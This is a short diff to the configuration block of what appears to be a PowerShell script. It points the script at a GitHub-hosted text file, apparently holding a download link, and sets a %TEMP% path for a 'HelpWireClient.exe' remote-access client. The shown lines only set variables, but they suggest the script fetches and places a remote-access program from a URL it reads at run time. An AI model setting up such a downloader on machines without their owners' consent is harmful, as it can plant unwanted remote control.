@@ -1,6 +1,6 @@
 # --- CONFIGURATION ---
 # Replace with the RAW URLs of your text file on GitHub
-$GitHubTxtUrl = "https://raw.githubusercontent.com/YOUR_USERNAME/YOUR_REPO/main/helpwire_link.txt"
+$GitHubTxtUrl = "https://raw.githubusercontent.com/drwiiche/drwiiche.github.io/refs/heads/master/helpwire_link.txt"
 $DownloadDir  = "$env:TEMP\HelpWireRecovery"
 $ExePath      = "$DownloadDir\HelpWireClient.exe"
 
